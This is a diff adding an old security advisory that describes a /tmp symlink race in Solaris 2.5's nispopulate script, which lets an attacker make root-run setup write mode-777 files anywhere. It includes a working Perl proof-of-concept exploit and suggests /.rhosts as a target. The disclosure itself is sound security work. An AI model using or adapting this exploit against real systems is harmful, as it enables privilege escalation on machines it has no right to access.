@@ -1,0 +1,63 @@
+Platform : Solaris 2.5
+Problem  : bad /tmp file creation
+Impact   : write files anywhere in the filesystem with mode 777
+
+The script '/usr/lib/nis/nispopulate' creates files with modebits 777 in
+/tmp. The files gleefully follow symlinks to where ever you like them to.
+
+In an attempt to make the names unpredictable, the filenames are postfixed
+with the process-id and a number from 0-4. However, the script does the
+following:
+
+1. creates files /tmp/sh<PID>[0-4] w/permission 666
+2. waits for user input
+3. creates file /tmp/passwd_<PID> w/permission 777
+
+A malicious program monitoring the /tmp directory for filenames
+'sh<PID>[0-4]' can snip out the PID and insert a symlink at
+/tmp/passwd_<PID> before it is created in step 3.
+
+'nispopulate' is used for migrating /etc-files or NIS-maps into
+NIS+-tables. It is run only once during the setup of a NIS+ server. So, no
+need to be alarmed. I'm not too sure about the rest of '/usr/lib/nis/*',
+but all of the scripts seem rather crummy as far as /tmp and
+filepermissions go.
+
+The attached perlscript sits waiting for /tmp/sh*' files to be created.
+When they are, a symlink to $destfile is placed in /tmp, in this case
+/hello.world. It could of course be /.rhosts, /usr/bin/.rhosts or
+whatever.
+
+NB! The exploit works only when you run 'nispopulate'.  The other
+'/usr/lib/nis/*' scripts will have no effect. This has the pleasing effect
+of preventing someone from starting the exploit and start hassling their
+admin to intall nis+. :)
+
+To test:
+
+---------------------------------- clip --------------------------------
+
+#!/opt/gnu/bin/perl
+
+# nisplus-exploit.pl
+#
+# to test: 1) start the script   2) as root, run /usr/lib/nispopulate
+# Demonstrates weakness in Solaris 2.5 /usr/lib/nis/nispopulate
+# shell script, by inserting a symlink postfixed with pid
+#
+#                                     - runeb@td.org.uit.no
+
+$destfile = "/hello.world";
+
+do {
+    opendir(TMP, "/tmp");
+    while ($f = readdir(TMP)) {
+        if (substr($f, 0, 2) eq "sh") {
+            symlink($destfile, "/tmp/passwd_" . substr($f,2,length($f)-3));
+            $quit=1; last;
+        }
+    }
+    closedir(TMP);
+    sleep(1);
+} while $quit == 0;
+
